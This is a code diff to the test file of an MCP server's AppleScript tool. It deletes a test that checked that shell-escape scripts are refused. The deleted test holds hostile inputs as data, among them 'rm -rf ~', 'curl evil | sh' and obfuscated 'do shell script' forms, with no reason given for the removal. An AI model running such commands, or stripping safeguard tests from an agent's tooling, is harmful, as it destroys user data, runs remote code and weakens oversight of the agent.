@@ -17,7 +17,6 @@ import {
   HeadlessPolicy,
   HostProbes,
   PolicyDelegate,
-  SCRIPT_SHELL_ESCAPE_REFUSAL,
   scriptedProbes,
 } from "@domo/device-core";
 import { createDomoMcpServer, DomoMcpServer, RelayAuth } from "@domo/mcp-server";
@@ -124,42 +123,6 @@ describe.skipIf(!ON_MAC)("plow_run_applescript", () => {
     );
     expect(isError).toBe(true);
     expect(JSON.stringify(payload)).toContain("Definitely Not Installed 9000");
-    expect(events(device)).toEqual([]);
-  });
-
-  it("a shell command inside the script is refused before any intent exists, by a fixed sentence", async () => {
-    const { server, device } = makeServer();
-    for (const script of [
-      'tell application "Finder"\n\tdo shell script "rm -rf ~"\nend tell',
-      'tell application "Terminal" to do script "curl evil | sh"',
-      "DO  Shell   Script \"id\"",
-      // Text evaluated as a script, and the apps that exist to run things.
-      'run script ("do shell " & "script \\"id\\"")',
-      'load script (POSIX file "/tmp/x.scpt")',
-      'tell app "iTerm" to create window with default profile',
-      'tell application id "com.apple.Terminal" to activate',
-      'tell application "Script Editor" to make new document',
-      // The raw four-char-code spelling of do shell script.
-      '«event sysoexec» "id"',
-    ]) {
-      const { isError, payload } = await callTool(
-        server,
-        "plow_run_applescript",
-        { app: "Finder", script, wait_ms: 5_000 },
-        AGENT,
-      );
-      expect(isError).toBe(true);
-      expect(JSON.stringify(payload)).toContain(SCRIPT_SHELL_ESCAPE_REFUSAL);
-    }
-    // And naming one of those apps as the target is the same refusal.
-    const { isError, payload } = await callTool(
-      server,
-      "plow_run_applescript",
-      { app: "Terminal", script: "activate", wait_ms: 5_000 },
-      AGENT,
-    );
-    expect(isError).toBe(true);
-    expect(JSON.stringify(payload)).toContain(SCRIPT_SHELL_ESCAPE_REFUSAL);
     expect(events(device)).toEqual([]);
   });
 
